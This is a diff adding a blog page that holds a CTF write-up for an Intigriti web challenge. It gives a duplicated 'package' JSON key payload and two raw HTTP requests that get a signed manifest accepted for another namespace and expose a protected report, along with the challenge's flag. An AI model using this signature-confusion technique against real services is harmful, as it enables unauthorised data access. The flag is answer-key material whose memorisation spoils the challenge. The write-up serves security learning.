@@ -1,0 +1,202 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Intigriti Ctf 0726</title>
+    <link href="/static/favicon.ico" rel="icon"/>
+    <link href="/static/prism.css" rel="stylesheet"/>
+    <link href="/static/style.css" rel="stylesheet"/>
+</head>
+<body>
+
+<header>
+    <a href="/html/about.html"><img class="profile-pic" src="https://avatars.githubusercontent.com/u/122540000?v=4" alt="profile-pic"></a>
+    <a class="header" href="/html/about.html"><h1>Reab:~$<span class="cursor">▋</span></h1></a>
+    <div class="navs">
+        <h1><a class="header" href="/html/about.html">About</a></h1>
+        <h1><a class="header" href="/html/blog/index.html">Blog</a></h1>
+        <h1><a class="header" href="/html/personal/index.html">Personal</a></h1>
+        <h1><a class="header" href="/html/projects/index.html">Projects</a></h1>
+    </div>
+</header>
+
+<div class="global-content">
+<div class="inner-content">
+
+<!-- content start -->
+<h3>Overview</h3>
+
+<p><em>Goal</em> - find the flag <code>INTIGRITI{...}</code>
+<em>Flag</em> - Protected report contains the flag.</p>
+
+<h3>Application - high level</h3>
+
+<ul>
+<li><code>Register</code> and <code>login</code> and <code>logout</code> endpoints.</li>
+<li>View your <code>reports history</code>.</li>
+<li>View specific report - <code>GUID</code>.</li>
+<li>Report based on specific <code>package name &amp; version</code>.</li>
+</ul>
+
+<p>Reports needs to be signed then published for preflight.</p>
+
+<h3>Interesting info</h3>
+
+<ul>
+<li><p>My private namespace packages:</p>
+
+<ul>
+<li>hello-world (found) - <code>"Starter package for ordinary read-only compatibility reports."</code></li>
+<li>compat-sample (found) - <code>"Routine compatibility sample. No protected findings are included."</code></li>
+<li>legacy-adapter (found) - <code>"Historical ingestion retains the initial package declaration; report rendering uses reconstructed manifest data."</code></li>
+</ul></li>
+<li><p>Mentioned versions and corresponding packages:</p>
+
+<ul>
+<li>security-notes <code>1.0.0</code> (not found)</li>
+<li>compat-bridge <code>2.4.0</code> (not found)</li>
+<li>legacy-parser <code>0.9.0</code> (not found)</li>
+</ul></li>
+</ul>
+
+<p>Idea is to confuse the server to canonicalize manifest to retrieve the flag.</p>
+
+<h3>Target endpoint post data</h3>
+
+<pre><code class="json language-json">{
+  "package": {
+    "scope": "reab-b088927e",
+    "name": "legacy-adapter",
+    "version": "0.9.0"
+  },
+  "metadata": {
+    "description": "Compatibility check",
+    "visibility": "private"
+  },
+  "operation": "preflight"
+}
+</code></pre>
+
+<p>And that JSON manifest is in the b64 string in this.</p>
+
+<pre><code class="json language-json">{"manifest_b64":"ewogICJwYWNrYWdlIjogewogICAgInNjb3BlIjogInJlYWItYjA4ODkyN2UiLAogICAgIm5hbWUiOiAibGVnYWN5LWFkYXB0ZXIiLAogICAgInZlcnNpb24iOiAiMC45LjAiCiAgfSwKICAibWV0YWRhdGEiOiB7CiAgICAiZGVzY3JpcHRpb24iOiAiQ29tcGF0aWJpbGl0eSBjaGVjayIsCiAgICAidmlzaWJpbGl0eSI6ICJwcml2YXRlIgogIH0sCiAgIm9wZXJhdGlvbiI6ICJwcmVmbGlnaHQiCn0=","approval_id":"828d7745-d1d7-4e06-a4b1-963f6e192896","manifest_sha256":"ac41c40ec4eab27d9f688bf486b82d38fa874ee71cd2c73de8b69b0b08b5651a","nonce":"IqRGGL3GKH-S3klRxM_EQUljmoRrs3FZJO4RSjyAvTk","expires_at":1785411454,"signature":"gIzm8rOmXrFSH1yK7dcLkJZx5glTt+AiUVt2G7RnMPN0p2ZgakouA8r3hpSB4nK5Rc2VNC591CRs7oZ4tXsrCA=="}
+</code></pre>
+
+<h3>Solution</h3>
+
+<p><em>Flag</em>: <code>INTIGRITI{019f8700-4613-74fb-923e-781903e4bee9}</code>
+<em>CVSS</em>: <code>CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N</code></p>
+
+<h2>Overview</h2>
+
+<p>I am targeting <strong>security-notes</strong> report, which I don't have access to.
+To perform the exploit, two HTTP requests need to be sent using the following payload.</p>
+
+<p>Payload used for exploiting JSON key duplication (scope value should be your namespace, only on first value "reab-..."):</p>
+
+<pre><code class="json language-json">{
+  "package": {
+    "scope": "reab-b088927e",
+    "name": "security-notes",
+    "version": "1.0.0"
+  },
+  "package": {
+    "scope": "core",
+    "name": "security-notes",
+    "version": "1.0.0"
+  },
+  "metadata": {
+    "description": "Compatibility check",
+    "visibility": "private"
+  },
+  "operation": "preflight"
+}
+</code></pre>
+
+<h2>HTTP request 1</h2>
+
+<p>The payload is base64 encoded and sent as a JSON value of <strong>manifest_b64</strong> key.</p>
+
+<pre><code class="http language-http">POST /api/manifests/sign HTTP/1.1
+Host: challenge-0726.intigriti.io
+Connection: keep-alive
+Content-Length: 443
+x-csrf-token: [redacted]
+content-type: application/json
+Origin: https://challenge-0726.intigriti.io
+Cookie: cy_session=[redacted]
+X-Intigriti-Username: Reab
+
+{"manifest_b64":"ewogICJwYWNrYWdlIjogewogICAgInNjb3BlIjogInJlYWItYjA4ODkyN2UiLAogICAgIm5hbWUiOiAic2VjdXJpdHktbm90ZXMiLAogICAgInZlcnNpb24iOiAiMS4wLjAiCiAgfSwKICAicGFja2FnZSI6IHsKICAgICJzY29wZSI6ICJjb3JlIiwKICAgICJuYW1lIjogInNlY3VyaXR5LW5vdGVzIiwKICAgICJ2ZXJzaW9uIjogIjEuMC4wIgogIH0sCiAgIm1ldGFkYXRhIjogewogICAgImRlc2NyaXB0aW9uIjogIkNvbXBhdGliaWxpdHkgY2hlY2siLAogICAgInZpc2liaWxpdHkiOiAicHJpdmF0ZSIKICB9LAogICJvcGVyYXRpb24iOiAicHJlZmxpZ2h0Igp9"}
+</code></pre>
+
+<h2>HTTP request 2</h2>
+
+<p>After HTTP request 1 you should get "<strong>201 created</strong>" HTTP response code, if you get other response code, check if your cookie session is expired, or for pasting errors.
+The server will respond with JSON data that you will need to include in the next request among the "manifest_b64" from request 1.</p>
+
+<pre><code class="http language-http">POST /api/publications HTTP/1.1
+Host: challenge-0726.intigriti.io
+Connection: keep-alive
+Content-Length: 762
+x-csrf-token: [redacted]
+content-type: application/json
+Origin: https://challenge-0726.intigriti.io
+Cookie: cy_session=[redacted]
+X-Intigriti-Username: Reab
+
+{"manifest_b64":"ewogICJwYWNrYWdlIjogewogICAgInNjb3BlIjogInJlYWItYjA4ODkyN2UiLAogICAgIm5hbWUiOiAic2VjdXJpdHktbm90ZXMiLAogICAgInZlcnNpb24iOiAiMS4wLjAiCiAgfSwKICAicGFja2FnZSI6IHsKICAgICJzY29wZSI6ICJjb3JlIiwKICAgICJuYW1lIjogInNlY3VyaXR5LW5vdGVzIiwKICAgICJ2ZXJzaW9uIjogIjEuMC4wIgogIH0sCiAgIm1ldGFkYXRhIjogewogICAgImRlc2NyaXB0aW9uIjogIkNvbXBhdGliaWxpdHkgY2hlY2siLAogICAgInZpc2liaWxpdHkiOiAicHJpdmF0ZSIKICB9LAogICJvcGVyYXRpb24iOiAicHJlZmxpZ2h0Igp9","approval_id":"dd91a2ca-1c84-420a-a6e0-965d5bcc0a80","manifest_sha256":"ad446cb8bc2464a03899f9a6f3a36da8fc38614600da44cd4b01276af5ca1726","nonce":"FupwI5KyzZyLsnhf5orsuVQI8LKo2UOKXeUl85xQxno","expires_at":1785457127,"signature":"k6Apa93kJTcsKh2bIoLxQENK9VawQu/jPJN825PmsqKIRs/LRoeLW3SOOvo3nbxxek7db2VNEN/bcfWUK/9fDA=="}
+</code></pre>
+
+<h2>Verifying the result</h2>
+
+<p>If the exploit is successful the last request should also return "<strong>201 created</strong>".
+Take a look at the last report in your "<strong>Publication history</strong>".
+For example, my report:</p>
+
+<pre><code class="http language-http">GET /api/publications/f3494c78-ee72-4859-862d-9731f222146f HTTP/1.1
+Host: challenge-0726.intigriti.io
+</code></pre>
+
+<p>Returns the flag in <code>"release_notes": "INTIGRITI{[redacted]}"</code>:</p>
+
+<pre><code class="json language-json">{
+    "publication_id": "[redacted]",
+    "target": "@core/security-notes",
+    "version": "1.0.0",
+    "status": "ready",
+    "report": {
+        "digest": "ad446cb8bc2464a03899f9a6f3a36da8fc38614600da44cd4b01276af5ca1726",
+        "target": "@core/security-notes",
+        "compatibility": "Read-only preflight completed.",
+        "release_notes": "INTIGRITI{[redacted]}",
+        "latest_version": "1.0.0",
+        "package_exists": true
+    },
+    "created_at": "2026-07-31T00:14:37.549Z",
+    "approval_id": "dd91a2ca-1c84-420a-a6e0-965d5bcc0a80"
+}
+</code></pre>
+
+<!-- content end -->
+
+</div></div>
+
+<footer>
+    <div class="socials">
+        <p class="faint">©2026 Author: Mihajlo Frančić<br>
+        <a class="email" href="mailto:mihajlofrancic@gmail.com">mihajlofrancic@gmail.com</a></p>
+    </div>
+    <div class="socials">
+        </a><a href=https://github.com/0Reab><img class="socials" src=https://cdn.simpleicons.org/github/dbdbdb>
+        </a><a href=https://www.linkedin.com/in/mihajlo-francic-3650682bb><img class="socials" src=https://img.icons8.com/?size=100&id=8808&format=png&color=FDFDFD class=inline style=width:17px;height:17px;>
+        </a><a href=https://www.instagram.com/astrosamihajlom/><img class="socials" src=https://cdn.simpleicons.org/instagram/dbdbdb class=inline>
+        </a><a href=https://app.intigriti.com/researcher/profile/reab><img class="socials" src=https://cdn.simpleicons.org/intigriti/ffffff class=inline>
+        </a><a href=https://www.openbugbounty.org/researchers/reab/><img class="socials" src=https://cdn.simpleicons.org/openbugbounty/dbdbdb class=inline>
+    </div>
+</footer>
+
+<script src="/js/prism.js"></script>
+<script src="/js/main.js"></script>
+</body>
+</html>
